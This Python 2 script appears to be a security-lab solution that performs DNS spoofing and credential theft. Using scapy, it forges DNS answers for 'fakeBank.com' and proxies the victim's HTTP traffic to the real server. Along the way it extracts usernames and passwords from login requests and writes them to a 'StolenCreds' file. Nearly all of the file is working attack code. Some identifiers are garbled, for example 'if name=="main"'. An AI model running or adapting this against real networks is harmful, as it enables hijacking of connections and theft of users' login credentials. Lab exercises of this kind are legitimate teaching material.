import os
import argparse
import socket
from scapy.all import *
import sys
conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"

def resolveHostname(hostname):
  # IP address of HOSTNAME. Used to forward tcp connection.
  # Normally obtained via DNS lookup.
  return "127.1.1.1"

def log_credentials(username, password):
  # Write stolen credentials out to file
  # Do not change this
  with open("lib/StolenCreds.txt","wb") as fd:
    fd.write("Stolen credentials: username="+username+" password="+password)

def getQueryDict(query):
  # create a query dictionary from a query
  try:
    query1 = query.split("\n")[4]
    print query1
  except:
    return None
  try:
    query = query1.replace("'","")
    query_dict = dict(q.split("=") for q in query.split("&"))
  except ValueError:
    query_dict = None
  print "ok"
  return query_dict

def check_credentials(client_data):
  query_dict = getQueryDict(client_data)
  if query_dict:
    log_credentials(query_dict.get("username"), query_dict.get("password"))

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from urlparse import urlparse
def sendAndReceive_HTTP1_0(dest_ip, dest_port, request):
  # Connect to (dest_ip,dest_port), send request, and return response
  try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((dest_ip,dest_port))
    s.send(request)
    resp = s.recv(50000)
    s.close()
    return resp
  except:
    print("Failed to open TCP socket")
    exit()


def handle_tcp_forwarding(client_socket, client_ip, hostname):
  print "Start https"
  port = 8000
  source_ip = "127.0.0.3"

  print('Listening on localhost:%s' % port)
	
  while True:
	  conn, addr = client_socket.accept()
	  data = conn.recv(50000)
	  dest_ip = resolveHostname(HOSTNAME)
	  dest_port = 8000
	  print data
	  check_credentials(data)
	  request = data
		
	  resp = sendAndReceive_HTTP1_0(dest_ip, dest_port, request)

	  conn.sendall(resp)
	  if data.find("POST /post_logout") != -1:
		  print "exit"
		  conn.close()
		  sys.exit(0)
def dns_callback(packet, extra_args):
  answer = IP(src = packet[IP].dst, dst = packet[IP].src) /
    UDP(sport = packet[UDP].dport, dport = packet[UDP].sport) /
    DNS(id = packet[DNS].id, qr = 1, tc = 0, aa = 1, qd = packet[DNS].qd, an=DNSRR(rdata=extra_args[0], rrname="fakeBank.com", ttl=10))
  send(answer)
  handle_tcp_forwarding(extra_args[1], None, "fakeBank.com")

def sniff_and_spoof(source_ip):
  print "salam"
  def querysniff(pkt, source, socket):
    print "salam 2"
    if IP in pkt and UDP in pkt and DNS in pkt :
      dns_callback(pkt, [source, socket])
  sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  sock.bind(("127.0.0.3",8000))
  sock.listen(1)

  sniff(iface = "lo", filter = "port 53", prn = lambda packet: querysniff(packet, source_ip, sock), store = 0)
def main():
  parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
  parser.add_argument('--source_ip',nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')

  args = parser.parse_args()
  client_socket = None
  client_ip = None
  hostname = None
  sniff_and_spoof(args.source_ip)
if name=="main":
  # Change working directory to script's dir
  # Do not change this
  abspath = os.path.abspath(file)
  dname = os.path.dirname(abspath)
  print dname
  os.chdir(dname)
  main()
